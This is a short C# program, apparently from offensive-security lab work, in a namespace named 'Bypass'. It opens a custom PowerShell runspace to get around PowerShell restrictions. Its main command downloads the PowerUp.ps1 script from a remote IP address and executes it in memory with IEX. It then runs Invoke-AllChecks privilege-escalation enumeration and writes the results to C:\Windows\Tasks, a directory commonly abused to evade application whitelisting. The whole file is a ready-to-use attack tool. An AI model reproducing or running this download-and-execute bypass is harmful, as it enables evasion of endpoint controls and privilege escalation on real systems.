//custom runspace to downlooad & execute PowerUP Invoke-AllChecks inside custom runspace
//contents of Invoke-AllChecks output to test.txt 

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

						//installing powershell object & setting the runspace 
						PowerShell ps = PowerShell.Create();
						ps.Runspace = rs;

						//add ps script & execute 
						String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
						ps.AddScript(cmd);
						ps.Invoke();
						rs.Close();	
        }
    }
}
